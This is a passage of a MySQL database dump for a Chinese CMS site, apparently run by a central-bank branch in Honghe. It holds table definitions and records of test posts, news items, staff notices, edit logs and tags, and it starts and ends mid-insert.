'1', '1', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('179', '1', '1', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('180', '1', '1', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('181', '1', '1', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('182', '2', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('183', '1', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('184', '2', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('185', '3', '3', '3', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('186', '2', '2', '2', '0', '0', '0', '0', '0', '1', '1', '1', '0', '0', '0', '0', '0', '0'), ('187', '1', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('188', '3', '3', '3', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('189', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_doc`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_doc`;
CREATE TABLE `jc_content_doc` (
  `content_id` int(11) NOT NULL,
  `doc_path` varchar(255) NOT NULL COMMENT '文档路径',
  `swf_path` varchar(255) DEFAULT NULL COMMENT '转换的swf路径',
  `grain` int(11) NOT NULL DEFAULT '0' COMMENT '财富收益',
  `down_need` int(11) NOT NULL DEFAULT '0' COMMENT '下载需要财富',
  `is_open` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否开放',
  `file_suffix` varchar(10) NOT NULL COMMENT '文档文件格式',
  `avg_score` float(11,1) NOT NULL DEFAULT '0.0' COMMENT '平均得分',
  `swf_num` int(11) NOT NULL DEFAULT '1' COMMENT 'swf文件总量',
  `pdf_path` varchar(255) DEFAULT '' COMMENT '转换后pdf路径',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='文库相关';

-- ----------------------------
--  Table structure for `jc_content_ext`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_ext`;
CREATE TABLE `jc_content_ext` (
  `content_id` int(11) NOT NULL,
  `title` varchar(150) NOT NULL COMMENT '标题',
  `short_title` varchar(150) DEFAULT NULL COMMENT '简短标题',
  `author` varchar(100) DEFAULT NULL COMMENT '作者',
  `origin` varchar(100) DEFAULT NULL COMMENT '来源',
  `origin_url` varchar(255) DEFAULT NULL COMMENT '来源链接',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `release_date` datetime NOT NULL COMMENT '发布日期',
  `media_path` varchar(255) DEFAULT NULL COMMENT '媒体路径',
  `media_type` varchar(20) DEFAULT NULL COMMENT '媒体类型',
  `title_color` varchar(10) DEFAULT NULL COMMENT '标题颜色',
  `is_bold` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否加粗',
  `title_img` varchar(100) DEFAULT NULL COMMENT '标题图片',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图片',
  `type_img` varchar(100) DEFAULT NULL COMMENT '类型图片',
  `link` varchar(255) DEFAULT NULL COMMENT '外部链接',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '指定模板',
  `need_regenerate` tinyint(1) NOT NULL DEFAULT '1' COMMENT '需要重新生成静态页',
  `tpl_mobile_content` varchar(100) DEFAULT NULL COMMENT '手机内容页模板',
  `toplevel_date` datetime DEFAULT NULL COMMENT '固顶到期日期',
  `pigeonhole_date` datetime DEFAULT NULL COMMENT '归档日期',
  PRIMARY KEY (`content_id`),
  CONSTRAINT `fk_jc_ext_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容扩展表';

-- ----------------------------
--  Records of `jc_content_ext`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_ext` VALUES ('142', '测试图片1', '测试图片1测试图片1测试图片1测试图片1测试图片1', null, null, null, null, '2018-10-18 22:22:25', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('143', '测试图片2', '测试图片2测试图片2测试图片2测试图片2测试图片2测试图片2', null, null, null, null, '2018-10-18 22:22:43', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('144', '测试图片3', '测试图片2测试图片2测试图片2测试图片2测试图片2测试图片2', null, null, null, null, '2018-10-18 22:22:54', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('145', '软件1', null, null, null, null, null, '2018-10-18 22:46:23', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', '', null, null), ('146', '软件2', null, null, null, null, null, '2018-10-18 22:46:52', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', '', null, null), ('147', '中国工会第十七次全国代表大会在京开幕', null, null, null, null, '中国工会第十七次全国代表大会在京开幕', '2018-10-18 22:49:39', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/22172819poyd.jpg', null, '/WEB-INF/t/cms/www/default/content/news.html', '1', '', null, null), ('148', '央视快评】毫不动摇支持民营企业繁荣发展', null, null, null, null, '10月20日，习近平总书记在给“万企帮万村”行动中受表彰的民营企业家的回信中', '2018-10-18 22:49:49', null, 'CK', null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', '', null, null), ('149', '将改革开放进行到底”系列论坛10月25日开启 5部委负责人邀你共话改革开放', null, null, null, null, '10月18日，国家主席习近平向“一带一路”能源部长会议和国际能源变革论坛致贺信', '2018-10-18 22:50:01', null, 'CK', null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', '', null, null), ('150', '需要审核图片', '需要审核图片', null, null, null, '需要审核图片', '2018-10-19 13:00:51', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('151', '需要审核哦', '需要审核哦', null, null, null, '需要审核哦', '2018-10-19 13:01:28', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('152', '审核', '审核', null, null, null, null, '2018-10-19 13:02:41', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('153', '审核哦', null, null, null, null, null, '2018-10-19 13:03:53', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('154', '测绘', null, null, null, null, null, '2018-10-19 13:05:57', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('155', 'test', null, null, null, null, null, '2018-10-19 13:07:16', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('156', 'test2', null, null, null, null, null, '2018-10-19 13:13:26', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('157', '测试', null, null, null, null, null, '2018-10-19 13:15:25', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('158', '测试2333', null, null, null, null, null, '2018-10-19 13:17:13', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('159', '需要审核的图片哦', null, null, null, null, null, '2018-10-19 13:18:51', null, null, null, '0', null, null, null, null, '/WEB-INF/t/cms/www/default/content/news.html', '1', null, null, null), ('160', '图片新闻', null, null, null, null, null, '2018-10-19 21:15:39', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/21223644dgfi.jpg', null, null, '1', '', null, null), ('161', '图片新闻2', null, null, null, null, null, '2018-10-19 21:15:48', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/21223802uwg7.jpg', null, null, '1', '', null, null), ('162', '图片新闻333', null, null, null, null, null, '2018-10-19 21:15:58', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/212239436x09.jpg', null, null, '1', '', null, null), ('163', '综合文档1', null, null, null, null, '综合文档1', '2018-10-21 22:50:24', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/2122552437xw.jpg', null, null, '1', '', null, null), ('164', '综合文档2', null, null, null, null, '综合文档2', '2018-10-21 22:50:41', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/21225540cafl.jpg', null, null, '1', '', null, null), ('165', '综合文档3', null, null, null, null, '综合文档3', '2018-10-21 22:50:52', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('166', '综合文档4', null, null, null, null, null, '2018-10-21 22:51:03', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('167', '综合文档5', null, null, null, null, null, '2018-10-21 22:51:25', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/21230045m1jk.jpg', null, null, '1', '', null, null), ('168', '综合文档6', null, null, null, null, null, '2018-10-21 22:51:34', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('169', '综合文档7', null, null, null, null, null, '2018-10-21 23:02:20', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('170', '综合文档8', null, null, null, null, null, '2018-10-21 23:02:29', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('171', '综合文档9', null, null, null, null, null, '2018-10-21 23:02:38', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/21230435i3lq.jpg', null, null, '1', '', null, null), ('172', '综合文档10', null, null, null, null, null, '2018-10-21 23:02:52', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('173', '石屏支行开展“加强信息保护和支付安全，防范电信网络诈骗”宣传活动', null, null, null, null, '为落实贯彻好《中国人民银行关于加强支付结算管理防范电信网络新型违法犯罪有关事项的通知》', '2018-10-22 17:30:38', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/22180404a07f.jpg', null, null, '1', '', null, null), ('174', '建水支行开展防范电信网络欺诈宣传进乡镇 全力保护金融消费者权益', null, null, null, null, '时值2017年“国际消费者权益日”到来之际', '2018-10-22 17:31:38', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('175', '开远支行“加强信息保护和支付安全防范电信网络欺诈”宣传走入敬老院', null, null, null, null, '阳春三月，春意盎然。人行开远支行联合曲靖市商业银行到开远市朋阳敬老院开展', '2018-10-22 17:32:11', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('176', '人行泸西支行督促涉农银行业金融机构加强电信诈骗宣传工作', null, null, null, null, null, '2018-10-22 17:42:52', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('177', '石屏支行组织信息安全培训，提高职工信息安全意识', null, null, null, null, null, '2018-10-22 17:43:20', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('178', '泸西支行重点组织各银行业金融机构开展防电信网络诈骗宣传活动', null, null, null, null, null, '2018-10-22 17:43:48', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/22180404a07f.jpg', null, null, '1', '', null, null), ('179', '石屏支行组织信息安全培训，提高职工信息安全意识', null, null, null, null, null, '2018-10-22 17:44:21', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('180', '关于做好全国“两会”期间网络与信息系统安全保障工作的通知（特急）', null, null, null, null, null, '2018-10-22 17:46:07', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('181', '关于统计支行科技检查项目中发现的问题的通知', null, null, null, null, '按照中支机关要求，对审计中（包括内部检查和交叉检查）科技部分存在的问题进行统计，中支机关将收集进行整理，建立项目储备库，待条件允许将安排进行整改。各单位请参照2016版信息安全规范县支行版进行自查。请于27日邮件报送至黄锦，孟干邮箱。', '2018-10-22 17:46:30', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/22180659w694.jpg', null, null, '1', '', null, null), ('182', '红河中支完成公文结转', null, null, null, null, '按照上级工作安排，科技科按照安排完成2016年公文结转工作，顺利完成工作安排', '2018-10-22 17:46:58', null, 'CK', null, '0', null, null, '/honghe/u/cms/www/201810/22180614d86s.jpg', null, null, '1', '', null, null), ('183', '关于参加云南省移动金融和金融IC卡多应用经验交流视频会议的通知', null, null, null, null, null, '2018-10-22 17:48:58', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('184', '关于TCBS系统客户端升级的通知【特急】', null, null, null, null, null, '2018-10-22 17:49:24', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('185', '关于开展TMIS客户端软件版本升级的通知', null, null, null, null, null, '2018-10-22 17:50:04', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null), ('186', '360安全浏览器 10.1', null, null, null, null, null, '2018-10-22 18:21:20', null, null, null, '0', null, null, null, null, null, '1', '', null, null), ('187', '爱奇艺影音 6.6', null, null, null, null, '爱奇艺影音 6.6', '2018-10-22 18:22:09', null, null, null, '0', null, null, null, null, null, '1', '', null, null), ('188', 'PP助手 5.9.7', null, null, null, null, 'PP助手 5.9.7', '2018-10-22 18:23:27', null, null, null, '0', null, null, null, null, null, '1', '', null, null), ('189', 'QQ同步助手电脑版', null, null, null, null, 'QQ同步助手电脑版', '2018-10-22 18:27:16', null, null, null, '0', null, null, null, null, null, '1', '', null, null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_group_view`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_group_view`;
CREATE TABLE `jc_content_group_view` (
  `content_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`content_id`,`group_id`),
  KEY `fk_jc_content_group_v` (`group_id`),
  CONSTRAINT `fk_jc_content_group_v` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
  CONSTRAINT `fk_jc_group_content_v` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容浏览会员组关联表';

-- ----------------------------
--  Table structure for `jc_content_picture`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_picture`;
CREATE TABLE `jc_content_picture` (
  `content_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL COMMENT '排列顺序',
  `img_path` varchar(100) NOT NULL COMMENT '图片地址',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`content_id`,`priority`),
  CONSTRAINT `fk_jc_picture_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容图片表';

-- ----------------------------
--  Records of `jc_content_picture`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_picture` VALUES ('142', '0', '/honghe/u/cms/www/201810/21174523unnw.jpg', ''), ('160', '0', '/honghe/u/cms/www/201810/21223644dgfi.jpg', ''), ('161', '0', '/honghe/u/cms/www/201810/21223802uwg7.jpg', ''), ('162', '0', '/honghe/u/cms/www/201810/212239436x09.jpg', '');
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_record`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_record`;
CREATE TABLE `jc_content_record` (
  `content_record_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `content_id` int(11) NOT NULL DEFAULT '0' COMMENT '文章ID',
  `user_id` int(11) NOT NULL DEFAULT '0' COMMENT '操作人',
  `operate_time` datetime NOT NULL COMMENT '操作时间',
  `operate_type` tinyint(2) NOT NULL DEFAULT '0' COMMENT '0 新增 1修改 2审核 3退回 4移动 5生成静态页 6删除到回收站 7归档 8出档 9推送共享',
  PRIMARY KEY (`content_record_id`),
  KEY `fk_index_jc_content_record_content` (`content_id`),
  KEY `fk_index_jc_content_record_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=180 DEFAULT CHARSET=utf8 COMMENT='文章操作记录';

-- ----------------------------
--  Records of `jc_content_record`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_record` VALUES ('80', '142', '1', '2018-10-18 22:22:25', '0'), ('81', '143', '1', '2018-10-18 22:22:44', '0'), ('82', '144', '1', '2018-10-18 22:22:55', '0'), ('83', '145', '1', '2018-10-18 22:46:23', '0'), ('84', '146', '1', '2018-10-18 22:46:52', '0'), ('85', '147', '1', '2018-10-18 22:49:39', '0'), ('86', '148', '1', '2018-10-18 22:49:50', '0'), ('87', '149', '1', '2018-10-18 22:50:02', '0'), ('88', '149', '1', '2018-10-19 11:49:21', '1'), ('89', '148', '1', '2018-10-19 11:51:34', '1'), ('90', '149', '1', '2018-10-19 11:56:48', '1'), ('91', '147', '1', '2018-10-19 12:49:57', '1'), ('92', '150', '2', '2018-10-19 13:00:52', '0'), ('93', '151', '2', '2018-10-19 13:01:29', '0'), ('94', '152', '2', '2018-10-19 13:02:41', '0'), ('95', '153', '2', '2018-10-19 13:03:54', '0'), ('96', '154', '2', '2018-10-19 13:05:57', '0'), ('97', '155', '2', '2018-10-19 13:07:16', '0'), ('98', '156', '2', '2018-10-19 13:13:26', '0'), ('99', '157', '2', '2018-10-19 13:15:25', '0'), ('100', '158', '2', '2018-10-19 13:17:13', '0'), ('101', '158', '1', '2018-10-19 13:17:31', '2'), ('102', '158', '1', '2018-10-19 13:18:23', '6'), ('103', '157', '1', '2018-10-19 13:18:23', '6'), ('104', '156', '1', '2018-10-19 13:18:23', '6'), ('105', '155', '1', '2018-10-19 13:18:24', '6'), ('106', '154', '1', '2018-10-19 13:18:24', '6'), ('107', '153', '1', '2018-10-19 13:18:24', '6'), ('108', '152', '1', '2018-10-19 13:18:24', '6'), ('109', '151', '1', '2018-10-19 13:18:24', '6'), ('110', '150', '1', '2018-10-19 13:18:24', '6'), ('111', '159', '2', '2018-10-19 13:18:52', '0'), ('112', '147', '1', '2018-10-19 20:46:14', '1'), ('113', '148', '1', '2018-10-19 20:47:03', '1'), ('114', '149', '1', '2018-10-19 20:48:06', '1'), ('115', '148', '1', '2018-10-19 20:48:26', '1'), ('116', '147', '1', '2018-10-19 20:48:49', '1'), ('117', '159', '1', '2018-10-19 21:14:13', '4'), ('118', '144', '1', '2018-10-19 21:14:13', '4'), ('119', '143', '1', '2018-10-19 21:14:14', '4'), ('120', '142', '1', '2018-10-19 21:14:14', '4'), ('121', '159', '1', '2018-10-19 21:15:04', '4'), ('122', '144', '1', '2018-10-19 21:15:04', '4'), ('123', '143', '1', '2018-10-19 21:15:05', '4'), ('124', '142', '1', '2018-10-19 21:15:05', '4'), ('125', '160', '1', '2018-10-19 21:15:40', '0'), ('126', '161', '1', '2018-10-19 21:15:50', '0'), ('127', '162', '1', '2018-10-19 21:15:59', '0'), ('128', '142', '1', '2018-10-21 17:45:25', '1'), ('129', '160', '1', '2018-10-21 22:36:50', '1'), ('130', '160', '1', '2018-10-21 22:37:43', '1'), ('131', '161', '1', '2018-10-21 22:38:18', '1'), ('132', '162', '1', '2018-10-21 22:39:57', '1'), ('133', '160', '1', '2018-10-21 22:43:08', '1'), ('134', '161', '1', '2018-10-21 22:43:22', '1'), ('135', '162', '1', '2018-10-21 22:43:34', '1'), ('136', '163', '1', '2018-10-21 22:50:25', '0'), ('137', '164', '1', '2018-10-21 22:50:42', '0'), ('138', '165', '1', '2018-10-21 22:50:53', '0'), ('139', '166', '1', '2018-10-21 22:51:04', '0'), ('140', '167', '1', '2018-10-21 22:51:27', '0'), ('141', '168', '1', '2018-10-21 22:51:35', '0'), ('142', '163', '1', '2018-10-21 22:55:27', '1'), ('143', '164', '1', '2018-10-21 22:55:42', '1'), ('144', '167', '1', '2018-10-21 23:00:49', '1'), ('145', '169', '1', '2018-10-21 23:02:21', '0'), ('146', '170', '1', '2018-10-21 23:02:30', '0'), ('147', '171', '1', '2018-10-21 23:02:40', '0'), ('148', '172', '1', '2018-10-21 23:02:52', '0'), ('149', '171', '1', '2018-10-21 23:04:39', '1'), ('150', '147', '1', '2018-10-22 17:25:34', '1'), ('151', '148', '1', '2018-10-22 17:26:16', '1'), ('152', '149', '1', '2018-10-22 17:27:42', '1'), ('153', '147', '1', '2018-10-22 17:28:23', '1'), ('154', '173', '1', '2018-10-22 17:30:39', '0'), ('155', '174', '1', '2018-10-22 17:31:39', '0'), ('156', '175', '1', '2018-10-22 17:32:13', '0'), ('157', '176', '1', '2018-10-22 17:42:53', '0'), ('158', '177', '1', '2018-10-22 17:43:21', '0'), ('159', '178', '1', '2018-10-22 17:43:50', '0'), ('160', '179', '1', '2018-10-22 17:44:23', '0'), ('161', '180', '1', '2018-10-22 17:46:08', '0'), ('162', '181', '1', '2018-10-22 17:46:32', '0'), ('163', '182', '1', '2018-10-22 17:46:59', '0'), ('164', '183', '1', '2018-10-22 17:49:00', '0'), ('165', '184', '1', '2018-10-22 17:49:25', '0'), ('166', '185', '1', '2018-10-22 17:50:05', '0'), ('167', '178', '1', '2018-10-22 18:04:08', '1'), ('168', '173', '1', '2018-10-22 18:04:35', '1'), ('169', '182', '1', '2018-10-22 18:06:16', '1'), ('170', '182', '1', '2018-10-22 18:06:37', '1'), ('171', '181', '1', '2018-10-22 18:07:03', '1'), ('172', '186', '1', '2018-10-22 18:21:20', '0'), ('173', '187', '1', '2018-10-22 18:22:09', '0'), ('174', '188', '1', '2018-10-22 18:23:28', '0'), ('175', '188', '1', '2018-10-22 18:26:16', '1'), ('176', '146', '1', '2018-10-22 18:26:23', '6'), ('177', '145', '1', '2018-10-22 18:26:25', '6'), ('178', '187', '1', '2018-10-22 18:26:39', '1'), ('179', '189', '1', '2018-10-22 18:27:16', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_reward_fix`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_reward_fix`;
CREATE TABLE `jc_content_reward_fix` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `priority` int(11) NOT NULL DEFAULT '10',
  `reward_fix` double NOT NULL DEFAULT '0' COMMENT '固定值',
  UNIQUE KEY `jc_content_reward_fix` (`content_id`,`priority`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='内容打赏设置固定值';

-- ----------------------------
--  Table structure for `jc_content_share_check`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_share_check`;
CREATE TABLE `jc_content_share_check` (
  `share_check_id` int(11) NOT NULL AUTO_INCREMENT,
  `content_id` int(11) NOT NULL COMMENT '共享内容',
  `channel_id` int(11) NOT NULL COMMENT '共享栏目',
  `check_status` tinyint(4) NOT NULL DEFAULT '0' COMMENT '审核状态 0待审核 1审核通过 2推送',
  `check_opinion` varchar(255) DEFAULT NULL COMMENT '审核意见',
  `share_valid` tinyint(1) NOT NULL DEFAULT '0' COMMENT '共享有效性',
  PRIMARY KEY (`share_check_id`),
  KEY `fk_channel_jc_content_share` (`channel_id`),
  KEY `fk_check_jc_content_share` (`content_id`),
  CONSTRAINT `fk_channel_jc_content_share` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_check_jc_content_share` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS共享内容审核信息表';

-- ----------------------------
--  Table structure for `jc_content_tag`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_tag`;
CREATE TABLE `jc_content_tag` (
  `tag_id` int(11) NOT NULL AUTO_INCREMENT,
  `tag_name` varchar(50) NOT NULL COMMENT 'tag名称',
  `ref_counter` int(11) NOT NULL DEFAULT '1' COMMENT '被引用的次数',
  PRIMARY KEY (`tag_id`),
  UNIQUE KEY `ak_tag_name` (`tag_name`)
) ENGINE=InnoDB AUTO_INCREMENT=135 DEFAULT CHARSET=utf8 COMMENT='CMS内容TAG表';

-- ----------------------------
--  Records of `jc_content_tag`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_tag` VALUES ('1', '测试', '4'), ('2', '图片', '8'), ('3', '1', '2'), ('4', '2', '3'), ('5', '3', '2'), ('8', '需要', '3'), ('9', '审核', '4'), ('10', '哦', '3'), ('11', '审核审核', '1'), ('12', '测绘', '1'), ('13', 'test', '1'), ('14', 'test2', '1'), ('15', '的', '7'), ('16', '新闻', '3'), ('17', '333', '1'), ('18', '综合', '9'), ('19', '文档', '9'), ('20', '4', '1'), ('21', '5', '2'), ('22', '6', '1'), ('23', '7', '1'), ('24', '8', '1'), ('25', '9', '1'), ('26', '中国', '1'), ('27', '工会', '1'), ('28', '第', '1'), ('29', '十', '1'), ('30', '七次', '1'), ('31', '全国代表大会', '1'), ('32', '在京开幕', '1'), ('33', '央视', '1'), ('34', '快', '1'), ('35', '评', '1'), ('36', '毫不动摇', '1'), ('37', '支持', '1'), ('38', '民营企业', '1'), ('39', '繁荣', '1'), ('40', '发展', '1'), ('42', '将', '1'), ('43', '改革开放', '2'), ('44', '进行到底', '1'), ('45', '系列', '1'), ('46', '论坛', '1'), ('47', '10月', '1'), ('48', '25日', '1'), ('49', '开启', '1'), ('50', '部委', '1'), ('51', '负责人', '1'), ('52', '邀', '1'), ('53', '你', '1'), ('54', '共话', '1'), ('55', '石屏', '3'), ('56', '支行', '8'), ('57', '开展', '4'), ('58', '加强', '3'), ('59', '信息', '7'), ('60', '保护', '3'), ('61', '和', '3'), ('62', '支付', '2'), ('63', '安全', '4'), ('64', '防范', '3'), ('65', '电信', '5'), ('66', '网络', '5'), ('67', '诈骗', '3'), ('68', '宣传', '4'), ('69', '活动', '2'), ('70', '建水', '1'), ('71', '欺诈', '2'), ('72', '进', '1'), ('73', '乡镇', '1'), ('74', '全力', '1'), ('75', '金融', '3'), ('76', '消费者', '1'), ('77', '权益', '1'), ('78', '开远', '1'), ('79', '走入', '1'), ('80', '敬老院', '1'), ('81', '人行', '1'), ('82', '泸西', '2'), ('83', '督促', '1'), ('84', '涉农', '1'), ('85', '银行业', '2'), ('86', '金融机构', '2'), ('87', '宣传工作', '1'), ('88', '组织', '3'), ('89', '培训', '2'), ('90', '提高', '2'), ('91', '职工', '2'), ('92', '安全意识', '2'), ('93', '重点', '1'), ('94', '各', '1'), ('95', '防', '1'), ('96', '关于', '5'), ('97', '做好', '1'), ('98', '全国', '1'), ('99', '两会', '1'), ('100', '期间', '1'), ('101', '与', '1'), ('102', '系统安全', '1'), ('103', '保障', '1'), ('104', '工作', '1'), ('105', '通知', '5'), ('106', '特急', '2'), ('107', '统计', '1'), ('108', '科技', '1'), ('109', '检查', '1'), ('110', '项目', '1'), ('111', '中', '1'), ('112', '发现', '1'), ('113', '问题', '1'), ('114', '红河', '1'), ('115', '中支', '1'), ('116', '完成', '1'), ('117', '公文', '1'), ('118', '结转', '1'), ('119', '参加', '1'), ('120', '云南省', '1'), ('121', '移动', '1'), ('122', 'ic', '1'), ('123', '卡', '1'), ('124', '多', '1'), ('125', '应用', '1'), ('126', '经验交流', '1'), ('127', '视频会议', '1'), ('128', 'tcbs', '1'), ('129', '系统', '1'), ('130', '客户端', '2'), ('131', '升级', '2'), ('132', 'tmis', '1'), ('133', '软件', '1'), ('134', '版本', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_topic`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_topic`;
CREATE TABLE `jc_content_topic` (
  `content_id` int(11) NOT NULL,
  `topic_id` int(11) NOT NULL,
  PRIMARY KEY (`content_id`,`topic_id`),
  KEY `fk_jc_content_topic` (`topic_id`),
  CONSTRAINT `fk_jc_content_topic` FOREIGN KEY (`topic_id`) REFERENCES `jc_topic` (`topic_id`),
  CONSTRAINT `fk_jc_topic_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS专题内容关联表';

-- ----------------------------
--  Table structure for `jc_content_txt`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_txt`;
CREATE TABLE `jc_content_txt` (
  `content_id` int(11) NOT NULL,
  `txt` longtext COMMENT '文章内容',
  `txt1` longtext COMMENT '扩展内容1',
  `txt2` longtext COMMENT '扩展内容2',
  `txt3` longtext COMMENT '扩展内容3',
  PRIMARY KEY (`content_id`),
  CONSTRAINT `fk_jc_txt_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容文本表';

-- ----------------------------
--  Records of `jc_content_txt`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_txt` VALUES ('147', '<p style=\"text-align:center;margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\"><span style=\"font-weight: 600 !important;\"><span style=\"color:navy\">中国工会第十七次全国代表大会在京开幕</span></span></p><p style=\"text-align:center;margin-top: 0px; margin-bottom: 15px; padding: 0px; font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\" color:=\"\"><span style=\"font-weight: 600 !important;\">习近平李克强栗战书汪洋赵乐际韩正到会祝贺</span></p><p style=\"text-align:center;margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\"><span style=\"font-weight: 600 !important;\"><span 